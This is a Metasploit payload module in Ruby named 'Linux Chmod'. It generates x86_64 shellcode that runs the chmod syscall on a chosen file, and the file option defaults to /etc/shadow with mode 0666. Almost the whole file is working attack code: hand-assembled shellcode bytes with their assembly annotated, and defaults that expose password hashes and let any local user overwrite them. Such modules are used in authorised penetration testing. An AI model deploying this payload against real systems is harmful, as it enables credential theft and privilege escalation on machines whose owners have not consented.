##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

###
#  Linux Chmod(file, mode)
#
#  Konrad Beckmann - 2015-01-01
###
module Metasploit3
  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Linux Chmod',
      'Description' => 'Runs chmod on specified file with specified mode',
      'Author'      => 'konrad beckmann',
      'License'     => BSD_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86_64))

    register_options(
      [
        OptString.new('FILE', [ true, "Filename to chmod", "/etc/shadow" ]),
        OptString.new('MODE', [ true, "File mode (octal)", "0666" ]),
      ], self.class)
  end

  # Dynamically generates chmod(FILE, MODE). Doesn't call exit(), use AppendExit=true
  def generate_stage

    file       = (datastore['FILE'] || '/etc/shadow') << "\x00"
    mode       = (datastore['MODE'] || "0666").oct

    call = "\xe8" + [file.length].pack('V')
    setmode = "\xbe" + [mode].pack('V')

    payload	=
        "\x6a\x5a"             + # pushq  $0x5a
        "\x58"                 + # pop    %rax
	call                   + # callq <after _file>
        file                   + # .ascii "file\0"
        "\x5f"                 + # pop    %rdi
        setmode                + # mov    mode, %esi
        "\x0f\x05"               # syscall
  end
end
